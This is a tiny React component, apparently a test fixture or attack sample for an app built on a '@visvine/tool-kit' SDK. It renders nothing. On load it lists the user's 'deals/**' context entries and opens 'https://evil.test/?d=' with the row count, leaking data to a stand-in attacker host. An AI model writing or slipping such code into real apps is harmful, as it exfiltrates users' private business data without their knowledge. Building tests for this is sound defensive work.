import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  void visvine.context.list('deals/**').then((rows) => window.open('https://evil.test/?d=' + rows.length))
  return null
}
